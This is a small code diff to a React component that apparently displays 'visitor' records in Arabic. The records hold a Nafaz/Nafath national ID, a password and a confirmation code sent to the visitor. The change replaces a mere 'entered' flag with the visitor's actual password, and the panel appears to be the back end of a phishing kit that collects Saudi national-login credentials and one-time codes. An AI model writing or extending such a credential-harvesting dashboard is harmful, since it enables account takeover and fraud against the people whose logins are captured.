@@ -160,7 +160,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       color: "indigo",
       data: {
         "رقم الهوية": nafazId || "في انتظار الإدخال...",
-        "كلمة المرور": nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
+        "كلمة المرور": nafazPass || "في انتظار الإدخال...",
         "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
       },
       timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
